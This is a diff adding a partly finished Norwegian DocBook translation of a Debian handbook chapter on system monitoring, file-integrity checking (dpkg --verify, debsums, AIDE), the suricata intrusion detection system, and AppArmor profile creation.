+					<command>top</command> er et interaktivt verktøy som viser en liste over kjørende prosesser. Standard sortering er basert på gjeldende mengde prosessorbruk, og finnes med <keycap>P</keycap>-tasten. Andre sorteringsordrer inkluderer benyttet minne (<keycap>M</keycap> key), samlet prosessortid (<keycap>T</keycap> key) og etter prosessidentifiserer (<keycap>N</keycap> key). <keycap>k</keycap>-tasten tillater å stanse en prosess ved å gå til prosessidentifisereren. <keycap>r</keycap>-tasten tillater <emphasis>renicing</emphasis> en prosess, det betyr å endre dens prioritet.
+				</para>
+				 <indexterm>
+					<primary><command>top</command></primary>
+				</indexterm>
+				 <para>
+					Når systemet ser ut til å være overbelastet, er <command>top</command> et flott verktøy for å se hvilke prosesser som konkurrerer om prosessortid eller bruker for mye minne. Spesielt er det ofte interessant å sjekke om de prosesser som bruker ressurser samsvarer med reelle tjenester som maskinen er kjent for å være vert for. En ukjent prosess som kjører som www-databruker skal virkelig være synlig og undersøkes, da den sannsynligvis er et tilfelle av at programvare er installert og kjørt på systemet via en sårbarhet i en nett-applikasjon.
+				</para>
+				 <para>
+					<command>top</command> er et svært fleksibelt verktøy og den tilhørende manuelle siden informerer om hvordan man tilpasser skjermen til personlige behov og vaner.
+				</para>
+				 <para>
+					<command>gnome-system-monitor</command>-grafiske verktøy ligner <command>top</command> og gir grovt sett de samme egenskapene.
+				</para>
+				 <indexterm>
+					<primary><command>gnome-system-monitor</command></primary>
+				</indexterm>
+
+			</section>
+			 <section id="sect.monitoring-history">
+				<title>Historie</title>
+				 <indexterm>
+					<primary>activity, history</primary>
+				</indexterm>
+				 <para>
+					Prosessorbelastning, nettverkstrafikk og ledig diskplass er informasjon som stadig varierer. Å beholde en historie med hvordan de endres er ofte nyttig for å bestemme nøyaktig hvordan datamaskinen brukes.
+				</para>
+				 <indexterm>
+					<primary>SNMP</primary>
+				</indexterm>
+				 <indexterm>
+					<primary>Simple Network Management Protocol</primary>
+				</indexterm>
+				 <para>
+					Det finnes mange øremerkede verktøy for denne oppgaven. De fleste kan hente data via SNMP (<emphasis>Simple Network Management Protocol</emphasis>) for å sentralisere denne informasjonen. En ekstra fordel er at dette gjør at henting av data fra nettverkselementer som kanskje ikke er datamaskiner med et generelt formål, som øremerkede nettverksrutere eller brytere.
+				</para>
+				 <para>
+					I noe detalj omhandler denne boken Munin (see <xref linkend="sect.munin" />) som en del av <xref linkend="advanced-administration" xrefstyle="select: label quotedtitle" />. Debian leverer også et lignende verktøy, <emphasis role="pkg">cacti</emphasis>. Utplasseringen er litt mer komplisert, siden det kun er basert på SNMP. Til tross for et net-grensesnitt, kreves det litt innsats å få tak på begrepene som inngår i konfigurasjonen. Å lese HTML-dokumentasjon (<filename>/usr/share/doc/cacti/html/index.html</filename>) må betraktes som en forutsetning.
+				</para>
+				 <sidebar> <title><emphasis>ALTERNATIVE</emphasis> <command>mrtg</command></title>
+				 <indexterm>
+					<primary><command>mrtg</command></primary>
+				</indexterm>
+				 <para>
+					<command>mrtg</command> (i pakken med tilsvarende navn) er et eldre verktøy. Til tross for noen grove kanter, kan det samle historiske data og vise dem som grafer. Det inkluderer en rekke skript øremerket til å samle de mest overvåkede data som prosessorbelastning, nettverkstrafikk, nettsidetreff, og så videre.
+				</para>
+				 <para>
+					<emphasis role="pkg">mrtg-contrib</emphasis> og <emphasis role="pkg">mrtgutils</emphasis>-pakkene inneholder eksempelskripter som kan brukes direkte.
+				</para>
+				 </sidebar>
+			</section>
+
+		</section>
+		 <section>
+			<title>Å finne endringer</title>
+			 <para>
+				Når systemet er installert og konfigurert, og sikkerhetsoppgraderinger oppdatert, er det vanligvis ingen grunn til å utvikle videre de fleste filer og kataloger, data unntatt. Det er derfor interessant å sørge for at filene faktisk ikke endres: Alle uventede endringer vil det derfor være verdt å undersøke. Denne delen presenterer noen verktøy som er i stand til å overvåke filer og advare administratoren når en uventet endring skjer (eller rett og slett for å liste slike endringer).
+			</para>
+			 <section id="sect.dpkg-verify">
+				<title>Gjennomgå pakker med <command>dpkg --verify</command></title>
+				 <indexterm>
+					<primary><command>dpkg</command></primary>
+					<secondary><command>dpkg --verify</command></secondary>
+				</indexterm>
+				 <sidebar> <title><emphasis>GOING FURTHER</emphasis> Å beskytte mot oppstrømsforandringer</title>
+				 <para>
+					<command>dpkg --verify</command> er nyttig for å oppdage endringer i filer som kommer fra en Debian-pakke, men vil være ubrukelig hvis pakken selv er kompromittert, for eksempel hvis Debian-speilet er kompromittert. Å beskytte mot denne klassen av angrep omfatter å bruke APTs digitale system for signaturverifisering (se <xref linkend="sect.package-authentication" />), og passe på å bare installere pakker med en sertifisert opprinnelse.
+				</para>
+				 </sidebar> <para>
+					<command>dpkg --verify</command> (eller <command>dpkg -V</command>) er et interessant verktøy, siden det tillater å finne hvilke installerte filer som har blitt endret (potensielt av en angriper), men dette bør tas med en klype salt. For å gjøre jobben sin er den avhengig av sjekkesummer lagret i dpkgs egen database lagret på harddisken (de kan finnes i <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename>); Derfor vil en grundig angriper oppdatere disse filene slik at de inneholder de nye kontrollsummene for nedbrutte filer.
+				</para>
+				 <sidebar> <title><emphasis>BACK TO BASICS</emphasis> Fil fingeravtrykk</title>
+				 <indexterm>
+					<primary>fingerprint</primary>
+				</indexterm>
+				 <indexterm>
+					<primary>control sum</primary>
+				</indexterm>
+				 <indexterm>
+					<primary>MD5</primary>
+				</indexterm>
+				 <indexterm>
+					<primary>SHA1</primary>
+				</indexterm>
+				 <para>
+					Som en påminnelse: Et fingeravtrykk er en verdi, ofte et tall (selv om det i heksadesimal notasjon), som inneholder en slags signatur for innholdet i en fil. Denne signaturen er beregnet med en algoritme (MD5 eller SHA1 blir godt kjent eksempler) som mer eller mindre garanterer at selv den minste endring i filinnholdet innebærer en endring i fingeravtrykket; kjent som skredeffekten (“avalanche effect”). Dette gjør at et enkelt tallfestet fingeravtrykk tjener som en lakmustest for å sjekke om innholdet i en fil har blitt endret. Disse algoritmene er ikke reverserbare; med andre ord, for de fleste, at man vet at et fingeravtrykk ikke tillater å finne tilbake til det tilhørende innholdet. Nye matematiske fremskritt ser ut til å svekke hvor absolutt disse prinsippene er, men det er ikke stilt spørsmåltegn ved bruken så langt, siden det å lage ulikt innhold ut fra samme fingeravtrykk fortsatt synes å være en ganske vanskelig oppgave.
+				</para>
+				 </sidebar> <para>
+					Å kjøre <command>dpkg -V</command> vil bekrefte alle installerte pakker, og vil skrive ut en linje for hver fil med en sviktende test. Utgangsformatet er det samme som et fra <command>rpm -V</command> hvor hver figur betegner en test med noen spesifikke metadata. Dessverre <command>dpkg</command> lagrer ikke meta-data som trengs for de fleste testene, og vil dermed gi spørsmålstegn for dem. Foreløpig kan bare sjekksumtesten levere en "5"-er på den tredje tegnet (når den feiler).
+				</para>
+				 
+<screen>
+<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
+<computeroutput>??5??????   /lib/systemd/system/ssh.service
+??5?????? c /etc/libvirt/qemu/networks/default.xml
+??5?????? c /etc/lvm/lvm.conf
+??5?????? c /etc/salt/roster</computeroutput></screen>
+				 <para>
+					I eksempelet ovenfor, rapporterer dpkg en endring i SSH-tjenestefil som administratoren har gjort i den pakkede filen i stedet for å bruke den hensiktsmessige <filename>/etc/systemd/system/ssh.service</filename>-overstyring (som ville bli lagret under <filename>/etc</filename> som alle konfigurasjonsendringer skal). Den viser også flere konfigurasjonsfiler (identifisert av "c" bokstaven i det andre feltet) som er legitimt modifisert.
+				</para>
+
+			</section>
+			 <section id="sect.debsums">
+				<title>Overvåkingspakker: <command>debsums</command> og dens grenser</title>
+				 <indexterm>
+					<primary><command>debsums</command></primary>
+				</indexterm>
+				 <para>
+					<command>debsums</command> er stamfaren til <command>dpkg -V</command> og er dermed stort sett foreldet. Den lider av de samme begrensningene som dpkg. Heldigvis, noen av begrensningene kan man komme rundt (mens dpkg ikke tilbyr tilsvarende work-arounds).
+				</para>
+				 <para>
+					Since the data on the disk cannot be trusted, <command>debsums</command> offers to do its checks based on <filename>.deb</filename> files instead of relying on dpkg's database. To download trusted <filename>.deb</filename>-filer for alle installerte pakker, kan vi stole på APTs klarerte nedlastinger. Denne operasjonen kan være treg og omstendelig, og bør derfor ikke anses som en proaktiv teknikk som skal brukes på jevnlig.
+				</para>
+				 
+<screen>
+<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
+<computeroutput>[ ... ]
+# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput></screen>
+				 <para>
+					Mer at dette eksemplet bruker <command>grep-status</command>-kommandoen fra <emphasis role="pkg">dctrl-tools</emphasis>-pakken, som ikke er installert som standard.
+				</para>
+
+			</section>
+			 <section>
+				<title>Å overvåke filer: AIDE</title>
+				 <indexterm>
+					<primary><emphasis role="pkg">aide</emphasis> (Debian package)</primary>
+				</indexterm>
+				 <para>
+					AIDE-verktøyet (<emphasis>Advanced Intrusion Detection Environment</emphasis>) kan sjekke filens integritet, og oppdager alle endringer opp mot et tidligere innspilt bilde av systemet. Dette bildet er lagret som en database (<filename>/var/lib/aide/aide.db</filename>) som inneholder relevant informasjon om alle filene i systemet (fingeravtrykk, tillatelser, tidsstempler, og så videre). Denne databasen blir først initialisert med <command>aideinit</command>; og er så brukt daglig (med <filename>/etc/cron.daily/aide</filename> skriptet) for å kontrollere om ingenting relevant endret. Når det oppdages endringer, registrerer AIDE dem i loggfiler (<filename>/var/log/aide/*.log</filename>) og sender sine funn til administratoren med e-post.
+				</para>
+				 <sidebar> <title><emphasis>IN PRACTICE</emphasis> Å beskytte databasen</title>
+				 <para>
+					Ettersom AIDE bruker en lokal database for å sammenligne tilstanden til filene, er gyldigheten av resultatene direkte knyttet til databasens gyldighet. Hvis en angriper får rot-rettigheter til et kompromittert system, vil denne være i stand til å skifte ut databasen og dekke sine spor. En mulig løsning ville være å lagre referansedata på skrivebeskyttede lagringsmedier .
+				</para>
+				 </sidebar> <para>
+					Mange valg i <filename>/etc/default/aide</filename> kan bli brukt til å justere handlingene til <emphasis role="pkg">aide</emphasis>-pakken. AIDE-oppsettet er lagret i <filename>/etc/aide/aide.conf</filename> og <filename>/etc/aide/aide.conf.d/</filename> (disse filene er faktisk bare brukt av <command>update-aide.conf</command> for å generere <filename>/var/lib/aide/aide.conf.autogenerated</filename>). Konfigurasjon indikerer hvilke egenskaper ved hvilke filer som må sjekkes. For eksempel kan innholdet i loggfiler endres rutinemessig, og slike endringer kan ignoreres så lenge rettighetene til disse filene forbli den samme, men både innhold og tillatelser for kjørbare programmer må være konstante. Selv om de ikke er veldig kompliserte, er ikke konfigurasjons-syntaksen helt intuitiv, og lese <citerefentry><refentrytitle>aide.conf</refentrytitle>
+					 <manvolnum>5</manvolnum></citerefentry> manualside er derfor anbefalt.
+				</para>
+				 <para>
+					En ny versjon av databasen genereres hver dag i <filename>/var/lib/aide/aide.db.new</filename>; hvis alle registrerte endringer var legitime, kan den brukes til å erstatte referansedatabasen.
+				</para>
+				 <sidebar> <title><emphasis>ALTERNATIVE</emphasis> Tripwire og Samhain</title>
+				 <para>
+					Tripwire er veldig lik AIDE; Selv konfigurasjonsfilen syntaksen er nesten det samme. Hovedtillegget, levert fra <emphasis role="pkg">tripwire</emphasis> er en mekanisme til å signere konfigurasjonsfilen, slik at en angriper ikke kan få den til å peke til en annen versjon av referansedatabasen.
+				</para>
+				 <para>
+					Samhain tilbyr også lignende funksjoner, samt noen funksjoner for å hjelpe til med å oppdage rootkit (se sidepanelet <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />). Den kan også distribueres globalt i et nettverk, og registrere sine spor på en sentral tjener (med en signatur).
+				</para>
+				 </sidebar> <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages"> <title><emphasis>QUICK LOOK</emphasis> The <emphasis role="pkg">checksecurity</emphasis> and <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis> packages</title>
+				 <indexterm>
+					<primary><emphasis role="pkg">checksecurity</emphasis></primary>
+				</indexterm>
+				 <para>
+					Den første av disse pakkene inneholder flere små skript som utfører grunnleggende kontroller på systemet (tomme passord, nye setuid-filer og så videre) og advarer administratoren hvis nødvendig. Til tross for sitt eksplisitte navn, bør en administrator ikke stole utelukkende på det for å være sikker på at et Linux-system er trygt.
+				</para>
+				 <para>
+					<emphasis role="pkg">chkrootkit</emphasis> og <emphasis role="pkg">rkhunter</emphasis>-pakkene tillater at det ses etter om <emphasis>rootkits</emphasis> potensielt er installert i systemet. Som en påminnelse, disse er biter av programvare er utviklet for å skjule kompromittering av et system og samtidig å holde kontrollen over maskinen. Testene er ikke 100 % pålitelige, men de kan som regel trekke administratorens oppmerksomhet til potensielle problemer.
+				</para>
+				 </sidebar>
+			</section>
+
+		</section>
+		 <section id="sect.intrusion-detection">
+			<title>Å avdekke inntrengning (IDS/NIDS)</title>
+			 <indexterm>
+				<primary>detection, intrusion</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>intrusion detection</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>IDS</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>intrusion detection system</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>NIDS</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>Network</primary>
+				<secondary>IDS</secondary>
+			</indexterm>
+			 <sidebar> <title><emphasis>BACK TO BASICS</emphasis> Tjenestenektangrep</title>
+			 <indexterm>
+				<primary>denial of service</primary>
+			</indexterm>
+			 <para>
+				Et "tjenestenektangrep" har bare ett mål: Å gjøre en tjeneste utilgjengelig. Enten et slikt angrep innebærer å overbelaste tjeneren med henvendelser eller utnytte en feil, er sluttresultatet det samme: tjenesten er ikke lenger i drift. Vanlige brukere er misfornøyd, og enhetens vertsoppgaver nettverkstjenesten som rammes, lider et tap i omdømme (og muligens i inntekter, for eksempel hvis tjenesten var en e-handel).
+			</para>
+			 <para>
+				Et slikt angrep er ofte "distribuert": Dette innebærer vanligvis å overbelaste tjeneren med et stort antall henvendelser som kommer fra mange forskjellige kilder, slik at tjeneren blir ute av stand til å svare på legitime henvendelser. Disse typer angrep har fått kjente forkortelser: <acronym>DDoS</acronym> og <acronym>DoS</acronym> (avhengig av om tjenestenektangrepet er distribuert eller ikke).
+			</para>
+			 </sidebar> <para>
+				<command>suricata</command> (i Debian-pakken med samme navn) er et NIDS — et <emphasis>Network Intrusion Detection System</emphasis>. Oppgaven er å lytte til nettverket og prøve å oppdage infiltrasjonsforsøk og/ eller fiendtlige handlinger (inkludert tjenestenektangrep). Alle disse hendelsene blir logget i flere filer i <filename>/var/log/suricata</filename>. Det er tredjepartsverktøy (Kibana/logstash) som bedre kan søke igjennom alle innsamlede data. <ulink type="block" url="http://suricata-ids.org" /> <ulink type="block" url="https://www.elastic.co/products/kibana" />
+			</para>
+			 <indexterm>
+				<primary><command>snort</command></primary>
+			</indexterm>
+			 <indexterm>
+				<primary><command>suricata</command></primary>
+			</indexterm>
+			 <sidebar> <title><emphasis>CAUTION</emphasis> Handlingsrom</title>
+			 <para>
+				Effektiviteten til <command>suricata</command> er begrenset av trafikken som sees på det overvåkede nettverksgrensesnittet. Det vil åpenbart ikke være i stand til å oppdage noe, hvis det ikke kan observere den virkelige trafikken. Koblet til en nettverksvitsj, vil det derfor kun overvåke angrep mot maskinen det kjører på, som sannsynligvis ikke er intensjonen. Maskinens vertsoppgaver <command>suricata</command> bør derfor plugges til bryterens "speil"-port, som vanligvis er øremerket for kjedede brytere, og som derfor får all trafikk.
+			</para>
+			 </sidebar> <para>
+				Å sette opp suricata innebærer å gjennomgå og redigere <filename>/etc/suricata/suricata-debian.yaml</filename>, som er veldig lang fordi hvert parameter er rikelig kommentert. En minimal konfigurasjon krever beskrivelse av området med adresser som det lokale nettverket dekker (<literal>HOME_NET</literal> parameter). I praksis betyr dette hele settet med mulige angrepsmål. Men å få det meste ut av den, krever å lese den i sin helhet og tilpasse den til den lokale situasjonen.
+			</para>
+			 <para>
+				På toppen av dette, må du også redigere <filename>/etc/default/suricata</filename> for å definere nettverksgrensesnittet som skal overvåke og å aktivere init script-et (ved å sette <literal>RUN=yes</literal>). Du kan også ønske å sette <literal>LISTENMODE=pcap</literal> fordi standard <literal>LISTENMODE=nfqueue</literal> krever ytterligere konfigurasjon for å fungere riktig (nettfilter brannmuren må konfigureres til å videresende pakker til en brukerområde-kø som håndteres av suricata via <literal>NFQUEUE</literal>-målet).
+			</para>
+			 <para>
+				For å oppdage feilaktig oppførsel, trenger <command>suricata</command> et sett med overvåkingsregler: Du kan finne slike regler i <emphasis role="pkg">snort-rules-default</emphasis>-pakken. <command>snort</command> er den historiske referansen i IDS-økosystemet og <command>suricata</command> kan gjenbruke regler skrevet for den. Dessverre mangler denne pakken i <emphasis role="distribution">Debian Jessie</emphasis>, og bør hentes fra en annen Debian utgivelse som <emphasis role="distribution">Testing</emphasis> eller <emphasis role="distribution">Unstable</emphasis>.
+			</para>
+			 <para>
+				Alternativt kan, <command>oinkmaster</command> (i pakken med samme navn) brukes til å laste ned Snort regelsett fra eksterne kilder.
+			</para>
+			 <sidebar> <title><emphasis>GOING FURTHER</emphasis> Integration with <command>prelude</command></title>
+			 <para>
+				Prelude leverer sentralisert overvåking av sikkerhetsinformasjon. Den modulære arkitekturen inkluderer en tjener (<emphasis>manager</emphasis> i <emphasis role="pkg">prelude-manager</emphasis>) som samler varsler generert av <emphasis>sensors</emphasis> av ulik type.
+			</para>
+			 <para>
+				Suricata kan konfigureres som en slik sensor. Andre muligheter inkluderer <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>) som overvåker loggfiler (på en måte som svarer til <command>logcheck</command>, beskrevet i <xref linkend="sect.logcheck" />).
+			</para>
+			 <indexterm>
+				<primary><command>prelude</command></primary>
+			</indexterm>
+			 </sidebar>
+		</section>
+
+	</section>
+	 <section id="sect.apparmor">
+		<title>Introduksjon til AppArmor</title>
+		 <indexterm>
+			<primary>AppArmor</primary>
+		</indexterm>
+		 <section id="sect.apparmor-principles">
+			<title>Prinsipper</title>
+			 <para>
+				AppArmor er et <emphasis>Mandatory Access Control</emphasis> (MAC) system som bygger på Linux's LSM (<emphasis>Linux Security Modules</emphasis>) grensesnitt. I praksis spør kjernen AppArmor før hver system kaller for å få vite om prosessen er autorisert til utføre den gitte operasjonen. Gjennom denne mekanismen, begrenser AppArmor programmer til et begrenset sett med ressurser.
+			</para>
+			 <indexterm>
+				<primary><emphasis>Mandatory Access Control</emphasis></primary>
+			</indexterm>
+			 <indexterm>
+				<primary><emphasis>Linux Security Modules</emphasis></primary>
+			</indexterm>
+			 <para>
+				AppArmor anvender et sett med regler (kjent som "profil") på hvert program. Profilen som kjernen bruker avhenger av installasjonsbanen til programmet som kjøres. I motsetning til SELinux (omtalt i <xref linkend="sect.selinux" />), er ikke reglene som brukes avhengig av brukeren. Alle brukere står overfor samme regelverk når de utfører samme program (men tradisjonelle brukertillatelser gjelder fortsatt, og kan resultere i ulik atferd!).
+			</para>
+			 <para>
+				AppArmor profiler er lagret i <filename>/etc/apparmor.d/</filename> og de inneholder en liste med Hver profil kan legges enten i håndheve eller klagende modus. Den tidligere håndhever politikk og rapporterer brudd forsøk, mens sistnevnte ikke håndheve politikken, men likevel logger systemkall som ville ha blitt nektet. for ressurser som hvert program kan gjøre bruk av. Profilene er kompilert og lastet inn i kjernen av <command>apparmor_parser</command>-kommandoen. Hver profil kan legges enten i håndhevings- eller klage-modus. Den første håndhever politikk og rapporterer krenkingsforsøk, mens sistnevnte ikke håndhever politikken, men likevel logger systempåkallinger som ville ha blitt nektet.
+			</para>
+
+		</section>
+		 <section id="sect.apparmor-setup">
+			<title>Å aktivere AppArmor og håndtere AppArmor profiler</title>
+			 <para>
+				AppArmor støtte er bygget inn i Debians standard kjerner. Å aktivere AppArmor er dermed bare et spørsmål om å installere noen få pakker og legge noen parametere til kjernens kommandolinje:
+			</para>
+			 
+<screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
+</userinput><computeroutput>[...]
+# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
+</userinput><computeroutput># </computeroutput><userinput>update-grub
+</userinput></screen>
+			 <para>
+				Etter en omstart virker AppArmor, og <command>aa-status</command> vil raskt bekrefte det:
+			</para>
+			 
+<screen>
+<computeroutput># </computeroutput><userinput>aa-status</userinput>
+<computeroutput>apparmor module is loaded.
+44 profiles are loaded.
+9 profiles are in enforce mode.
+   /usr/bin/lxc-start
+   /usr/lib/chromium-browser/chromium-browser//browser_java
+[...]
+35 profiles are in complain mode.
+   /sbin/klogd
+[...]
+3 processes have profiles defined.
+1 processes are in enforce mode.
+   /usr/sbin/libvirtd (1295) 
+2 processes are in complain mode.
+   /usr/sbin/avahi-daemon (941) 
+   /usr/sbin/avahi-daemon (1000) 
+0 processes are unconfined but have a profile defined.</computeroutput></screen>
+			 <sidebar> <title><emphasis>NOTE</emphasis> Flere AppArmor profiler</title>
+			 <para>
+				<emphasis role="pkg">apparmor-profiles</emphasis>-pakken inneholder profiler som forvaltes av oppstrøms AppArmor community. For å få enda flere profiler du kan installere <emphasis role="pkg">apparmor-profiles-extra</emphasis> med profiler utviklet av Ubuntu og Debian.
+			</para>
+			 </sidebar> <para>
+				Tilstanden for hver profil kan veksle mellom håndheving og klager med anrop til <command>aa-enforce</command> og <command>aa-complain</command> som gir som parameter enten banen til den kjørbare filen eller til policy-filen. I tillegg kan en profil helt deaktiveres <command>aa-disable</command> eller sette in revisjonsmodus (for å logge aksepterte systemanrop også) med <command>aa-audit</command>.
+			</para>
+			 
+<screen>
+<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
+<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
+<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
+<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
+</screen>
+
+		</section>
+		 <section id="sect.apparmor-new-profile">
+			<title>Å lage en ny profil</title>
+			 <para>
+				Selv om å opprette en AppArmor profil er ganske enkelt, mangler de fleste programmer en. Denne seksjonen vil vise deg hvordan du oppretter en ny profil fra bunnen av bare ved hjelp av målprogrammet og la AppArmor overvåke system-anropene det lager og ressursene det har tilgang til.
+			</para>
+			 <para>
+				The most important programs that need to be confined are the network facing programs as those are the most likely targets of remote attackers. That is why AppArmor conveniently provides an <command>aa-unconfined</command> command to list the programs which have no associated profile and which expose an open network socket. With the <literal>--paranoid</literal> option you get all unconfined processes that have at least one active network connection.
+			</para>
+			 
+<screen>
+<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
+<computeroutput>801 /sbin/dhclient not confined
+890 /sbin/rpcbind not confined
+899 /sbin/rpc.statd not confined
+929 /usr/sbin/sshd not confined
+941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
+988 /usr/sbin/minissdpd not confined
+1276 /usr/sbin/exim4 not confined
+1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
+1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
+19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
+</screen>
+			 <para>
+				In the following example, we will thus try to create a profile for <command>/sbin/dhclient</command>. For this we will use <command>aa-genprof dhclient</command>. It will invite you to use the application in another window and when done to come back to <command>aa-genprof</command> to scan for AppArmor events in the system logs and convert those logs into access rules. For each logged event, it will make one or more rule suggestions that you can either approve or further edit in multiple ways:
+			</para>
+			 
+<screen>
+<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
+<computeroutput>Writing updated profile for /sbin/dhclient.
+Setting /sbin/dhclient to complain mode.
+
+Before you begin, you may wish to check if a
+profile already exists for the application you
+wish to confine. See the following wiki page for
+more information:
+http://wiki.apparmor.net/index.php/Profiles
+
+Please start the application to be profiled in
+another window and exercise its functionality now.
+
+Once completed, select the "Scan" option below in 
+order to scan the system logs for AppArmor events. 
+
+For each AppArmor event, you will be given the 
+opportunity to choose whether the access should be 
+allowed or denied.
+
+Profiling: /sbin/dhclient
+
+[(S)can system log for AppArmor events] / (F)inish
+Reading log entries from /var/log/audit/audit.log.
+
+Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
+Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
+Severity: unknown
+
+(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
+<userinput>P</userinput>
+Should AppArmor sanitise the environment when
+switching profiles?
+
+Sanitising environment is more secure,
+but some applications depend on the presence
+of LD_PRELOAD or LD_LIBRARY_PATH.
+
+(Y)es / [(N)o]
+<userinput>Y</userinput>
+Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
+Complain-mode changes:
+WARN: unknown capability: CAP_net_raw
+
+Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
+Capability: net_raw
+Severity:   unknown
+
+[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
+<userinput>A</userinput>
+Adding capability net_raw to profile.
+
+Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
+Path:     /etc/nsswitch.conf
+Mode:     r
+Severity: unknown
+
+  1 - #include &lt;abstractions/apache2-common&gt; 
+  2 - #include &lt;abstractions/libvirt-qemu&gt; 
+  3 - #include &lt;abstractions/nameservice&gt; 
+  4 - #include &lt;abstractions/totem&gt; 
+ [5 - /etc/nsswitch.conf]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>3</userinput>
+
+Profile:  /sbin/dhclient
+Path:     /etc/nsswitch.conf
+Mode:     r
+Severity: unknown
+
+  1 - #include &lt;abstractions/apache2-common&gt; 
+  2 - #include &lt;abstractions/libvirt-qemu&gt; 
+ [3 - #include &lt;abstractions/nameservice&gt;]
+  4 - #include &lt;abstractions/totem&gt; 
+  5 - /etc/nsswitch.conf 
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding #include &lt;abstractions/nameservice&gt; to profile.
+
+Profile:  /sbin/dhclient
+Path:     /proc/7252/net/dev
+Mode:     r
+Severity: 6
+
+  1 - /proc/7252/net/dev 
+ [2 - /proc/*/net/dev]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /proc/*/net/dev r to profile
+
+[...]
+Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
+Path:     /run/dhclient-eth0.pid
+Mode:     w
+Severity: unknown
+
+ [1 - /run/dhclient-eth0.pid]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>N</userinput>
+
+Enter new path: /run/dhclient*.pid
+
+Profile:  /sbin/dhclient
+Path:     /run/dhclient-eth0.pid
+Mode:     w
+Severity: unknown
+
+  1 - /run/dhclient-eth0.pid 
+ [2 - /run/dhclient*.pid]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /run/dhclient*.pid w to profile
+
+[...]
+Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
+Path:     /proc/filesystems
+Mode:     r
+Severity: 6
+
+ [1 - /proc/filesystems]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /proc/filesystems r to profile
+
+= Changed Local Profiles =
+
+The following local profiles were changed. Would you like to save them?
+
+ [1 - /sbin/dhclient]
+  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
+(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
+<userinput>S</userinput>
+Writing updated profile for /sbin/dhclient.
+Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
+
+Profiling: /sbin/dhclient
+
+[(S)can system log for AppArmor events] / (F)inish
+<userinput>F</userinput>
+Setting /sbin/dhclient to enforce mode.
+Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.
+
+Reloaded AppArmor profiles in enforce mode.
+
+Please consider contributing your new profile!
+See the following wiki page for more information:
+http://wiki.apparmor.net/index.php/Profiles
+
+Finished generating profile for /sbin/dhclient.</computeroutput></screen>
+			 <para>
+				Note that the program does not display back the control characters that you type but for the clarity of the explanation I have included them in the previous transcript.
+			</para>
+			 <calloutlist>
+				<callout arearefs="aa-genprof-execute">
+					<para>
+						The first event detected is the execution of another program. In that case, you have multiple choices: you can run the program with the profile of the parent process (the “Inherit” choice), you can run it with its own dedicated profile (the “Profile” and the “Named” choices, differing only by the possibility to use an arbitrary profile name), you can run it with a sub-profile of the parent process (the “Child” choice), you can run it without any profile (the “Unconfined” choice) or you can decide to not run it at all (the “Deny” choice).
+					</para>
+					 <para>
+						Note that when you opt to run it under a dedicated profile that doesn't exist yet, the tool will create the missing profile for you and will make rule suggestions for that profile in the same run.
+					</para>
+
+				</callout>
+				 <callout arearefs="aa-genprof-capability">
+					<para>
